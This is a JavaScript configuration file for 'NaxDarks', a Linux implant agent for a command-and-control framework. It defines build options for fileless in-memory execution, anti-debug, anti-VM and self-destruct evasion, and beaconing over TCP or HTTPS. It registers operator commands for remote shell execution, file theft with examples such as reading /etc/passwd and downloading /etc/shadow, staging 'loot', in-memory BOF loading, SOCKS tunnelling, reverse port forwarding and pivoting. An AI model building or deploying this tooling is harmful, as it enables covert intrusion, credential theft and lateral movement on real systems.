// ax_config.axs — naxdarks Linux Agent

var metadata = {
    name: "NaxDarks-Linux",
    description: "NaxDarks Linux implant — TCP pivot (bind) or connect-out, AES-128-CBC"
};

function GenerateUI(listeners_type)
{
    let isHttps = listeners_type.includes("NaxDarksHTTPS");

    let container = form.create_container();
    let tab1 = form.create_gridlayout();
    let t1r  = 0;

    let comboArch = form.create_combo();
    comboArch.addItems(["x64", "arm64"]);

    let comboFormat = form.create_combo();
    comboFormat.addItems(["elf", "so"]);
    tab1.addWidget(form.create_label("Architecture:"), t1r, 0);
    tab1.addWidget(comboArch, t1r, 1); t1r++;

    tab1.addWidget(form.create_label("Format:"), t1r, 0);
    tab1.addWidget(comboFormat, t1r, 1); t1r++;

    let comboMode = form.create_combo();
    if (isHttps) {
        comboMode.addItems(["https (HTTPS → C2)"]);
        comboMode.setEnabled(false);
    } else {
        comboMode.addItems(["bind (pivot — wait for parent)", "connect (direct → C2)"]);
    }
    tab1.addWidget(form.create_label("TCP Mode:"), t1r, 0);
    tab1.addWidget(comboMode, t1r, 1); t1r++;

    let checkDebug = form.create_check("Debug (verbose — print to stderr)");
    checkDebug.setChecked(false);
    tab1.addWidget(checkDebug, t1r, 0, 1, 2); t1r++;

    let spinSleep  = form.create_spin();
    let spinJitter = form.create_spin();
    if (isHttps) {
        spinSleep.setRange(0, 3600);
        spinSleep.setValue(5);
        spinJitter.setRange(0, 100);
        spinJitter.setValue(0);
        tab1.addWidget(form.create_label("Sleep (s):"),  t1r, 0);
        tab1.addWidget(spinSleep,  t1r, 1); t1r++;
        tab1.addWidget(form.create_label("Jitter (%):"), t1r, 0);
        tab1.addWidget(spinJitter, t1r, 1); t1r++;
    }

    let checkInMem = form.create_check("In-Memory (memfd_create — fileless execution)");
    checkInMem.setChecked(false);
    tab1.addWidget(checkInMem, t1r, 0, 1, 2); t1r++;

    let checkOpsec = form.create_check("OPSEC (anti-debug, anti-VM, self-destruct)");
    checkOpsec.setChecked(false);
    tab1.addWidget(checkOpsec, t1r, 0, 1, 2); t1r++;

    tab1.addWidget(form.create_vspacer(), t1r, 0, 1, 2);

    let tab1Panel = form.create_panel();
    tab1Panel.setLayout(tab1);

    let tabs = form.create_tabs();
    tabs.addTab(tab1Panel, "Linux Build");

    let rootLayout = form.create_vlayout();
    rootLayout.addWidget(tabs);
    let rootPanel = form.create_panel();
    rootPanel.setLayout(rootLayout);

    container.put("arch",      comboArch);
    container.put("format",    comboFormat);
    container.put("tcp_mode",  comboMode);
    container.put("debug",     checkDebug);
    container.put("inmem",     checkInMem);
    container.put("opsec",     checkOpsec);
    container.put("sleep_ms",  spinSleep);
    container.put("jitter_pct", spinJitter);

    return {
        ui_panel:     rootPanel,
        ui_container: container,
        ui_height:    200,
        ui_width:     380
    };
}

function RegisterCommands(listenerType)
{
    let cmd_whoami = ax.create_command("whoami", "Show current user, UID, GID",         "whoami",             "Getting info...");
    let cmd_pwd    = ax.create_command("pwd",    "Print current working directory",      "pwd",                "Getting directory...");
    let cmd_env    = ax.create_command("env",    "Print environment variables",          "env",                "Getting environment...");

    let cmd_cd = ax.create_command("cd", "Change working directory", "cd /tmp", "Changing directory...");
    cmd_cd.addArgString("path", false, "Path (empty = home)");

    let cmd_ls = ax.create_command("ls", "List directory contents", "ls /etc", "Listing...");
    cmd_ls.addArgString("path", false, "Path (empty = current)");

    let cmd_cat = ax.create_command("cat", "Read file contents", "cat /etc/passwd", "Reading...");
    cmd_cat.addArgString("path", true, "File path");

    let cmd_mkdir = ax.create_command("mkdir", "Create directory", "mkdir /tmp/loot", "Creating...");
    cmd_mkdir.addArgString("path", true, "Path");

    let cmd_rmdir = ax.create_command("rmdir", "Remove empty directory", "rmdir /tmp/loot", "Removing...");
    cmd_rmdir.addArgString("path", true, "Path");

    let cmd_rm = ax.create_command("rm", "Delete file", "rm /tmp/file.txt", "Deleting...");
    cmd_rm.addArgString("path", true, "Path");

    let cmd_download = ax.create_command("download", "Download file from target", "download /etc/shadow", "Downloading...");
    cmd_download.addArgString("path", true, "Remote path");

    let cmd_upload = ax.create_command("upload", "Upload a local file to the agent machine", "upload {file} {path}", "Uploading...");
    cmd_upload.addArgFile("file",   true, "Local file to upload");
    cmd_upload.addArgString("path", true, "Destination path on the agent machine");

    let cmd_shell = ax.create_command("shell", "Execute via /bin/sh -c", "shell id", "Executing...");
    cmd_shell.addArgString("cmd", true, "Command");


    let cmd_ps = ax.create_command("ps", "List running processes (ps auxf)", "ps", "Listing...");

    let cmd_ifconfig = ax.create_command("ifconfig", "Show network interfaces (ip addr)", "ifconfig", "Getting interfaces...");

    let cmd_kill = ax.create_command("kill", "Kill process by PID", "kill 1234", "Killing...");
    cmd_kill.addArgString("pid", true, "PID");


    let cmd_zip = ax.create_command("zip", "Compress a file or directory into a ZIP archive", "zip /tmp/loot /tmp/loot.zip", "Compressing...");
    cmd_zip.addArgString("src", true,  "Source file or directory path");
    cmd_zip.addArgString("dst", false, "Destination .zip path (default: src + .zip)");

    let cmd_sleep = ax.create_command("sleep", "Set beacon sleep interval in seconds (HTTPS only)", "sleep 10 40", "Setting sleep...");
    cmd_sleep.addArgInt("seconds", true,  "Sleep interval in seconds");
    cmd_sleep.addArgInt("jitter", false, "Jitter percentage 0-100 (default 0)");

    // ---- bof (direct, manual args) ----
    let cmd_bof = ax.create_command("bof", "Execute an ELF BOF (.o file) in-memory", "bof {file} {args}", "Loading BOF...");
    cmd_bof.addArgFile("file", true, "ELF relocatable object (.o)");
    cmd_bof.addArgString("args", false, "Packed args: comma-separated type:value (str:hello,int:42,short:1)");

    // ---- bof_async (background BOF) ----
    let cmd_bof_async = ax.create_command("bof_async", "Execute an ELF BOF in background thread", "bof_async {file} {args}", "Starting async BOF...");
    cmd_bof_async.addArgFile("file", true, "ELF .o file");
    cmd_bof_async.addArgString("args", false, "Packed args (str:val,int:N or base64 from bof_pack)");

    // ---- jobs (list async jobs) ----
    let cmd_jobs = ax.create_command("jobs", "List running async BOF jobs", "jobs", "Listing...");

    // ---- jobkill (stop async job) ----
    let cmd_jobkill = ax.create_command("jobkill", "Stop a running async BOF job", "jobkill 0", "Killing...");
    cmd_jobkill.addArgString("job_id", true, "Job index (from jobs command)");

    // ---- profile_update (HTTPS runtime profile change) ----
    let cmd_profile_update = ax.create_command("profile_update", "Update HTTPS malleable profile at runtime", "profile_update {profile}", "Updating profile...");
    cmd_profile_update.addArgFile("profile", true, "Profile JSON file");

    let cmd_exit = ax.create_command("exit", "Terminate the agent", "exit", "Terminating...");

    // ---- socks ----
    let cmd_socks_start = ax.create_command("start", "Start a SOCKS5 (or SOCKS4) proxy on the operator machine", "socks start 1080", "Starting SOCKS proxy...");
    cmd_socks_start.addArgFlagString("-h", "address", false, "Bind address (default: 0.0.0.0)");
    cmd_socks_start.addArgInt("port",       true,  "Local port to listen on");
    cmd_socks_start.addArgBool("-socks4",   false, "Use SOCKS4 instead of SOCKS5");
    cmd_socks_start.addArgBool("-auth",     false, "Require username/password auth (SOCKS5 only)");
    cmd_socks_start.addArgString("username", false, "Auth username (requires -auth)");
    cmd_socks_start.addArgString("password", false, "Auth password (requires -auth)");

    let cmd_socks_stop = ax.create_command("stop", "Stop a running SOCKS proxy", "socks stop 1080", "Stopping SOCKS proxy...");
    cmd_socks_stop.addArgInt("port", true, "Port of the proxy to stop");

    let cmd_socks = ax.create_command("socks", "Manage SOCKS proxy tunnel through the agent");
    cmd_socks.addSubCommands([cmd_socks_start, cmd_socks_stop]);

    // ---- rportfwd ----
    let cmd_rportfwd_start = ax.create_command("start", "Open a reverse port forward: agent listens on lport, forwards to fwdhost:fwdport", "rportfwd start {lport} {fwdhost} {fwdport}", "Starting rportfwd...");
    cmd_rportfwd_start.addArgInt("lport",       true,  "Port the agent will listen on");
    cmd_rportfwd_start.addArgString("fwdhost",  true,  "Destination host to forward to");
    cmd_rportfwd_start.addArgInt("fwdport",     true,  "Destination port to forward to");
    cmd_rportfwd_start.addArgBool("-b",         false, "Bind on 0.0.0.0 instead of 127.0.0.1");

    let cmd_rportfwd_stop = ax.create_command("stop", "Stop a reverse port forward", "rportfwd stop {lport}", "Stopping rportfwd...");
    cmd_rportfwd_stop.addArgInt("lport", true, "Port to stop listening on");

    let cmd_rportfwd = ax.create_command("rportfwd", "Manage reverse port forwarding through the agent");
    cmd_rportfwd.addSubCommands([cmd_rportfwd_start, cmd_rportfwd_stop]);

    // ---- link (pivot) ----
    let cmd_link_tcp = ax.create_command("tcp-bind", "Connect to a child Linux beacon listening on a TCP port", "link tcp-bind {target} {port}", "Queuing link tcp-bind...");
    cmd_link_tcp.addArgString("target", true, "Target IP or hostname where the bind agent is listening");
    cmd_link_tcp.addArgInt("port",      true, "TCP port the bind agent is listening on");

    let cmd_link = ax.create_command("link", "Link to a child Linux pivot beacon via TCP");
    cmd_link.addSubCommands([cmd_link_tcp]);

    // ---- unlink ----
    let cmd_unlink = ax.create_command("unlink", "Disconnect a linked pivot agent", "unlink {pivot_id}", "Queuing unlink...");
    cmd_unlink.addArgString("pivot_id", true, "Pivot ID (8-char hex shown in link result, e.g. 00000021)");

    let group = ax.create_commands_group("NAX-Linux", [
        cmd_whoami, cmd_pwd, cmd_env,
        cmd_cd,
        cmd_ls, cmd_cat, cmd_mkdir, cmd_rmdir, cmd_rm,
        cmd_download, cmd_upload,
        cmd_shell,
        cmd_ps, cmd_kill,
        cmd_ifconfig,
        cmd_zip,
        cmd_sleep,
        cmd_profile_update,
        cmd_bof,
        cmd_bof_async,
        cmd_jobs,
        cmd_jobkill,
        cmd_exit,
        cmd_socks, cmd_rportfwd,
        cmd_link, cmd_unlink
    ]);

    return { commands_linux: group };
}
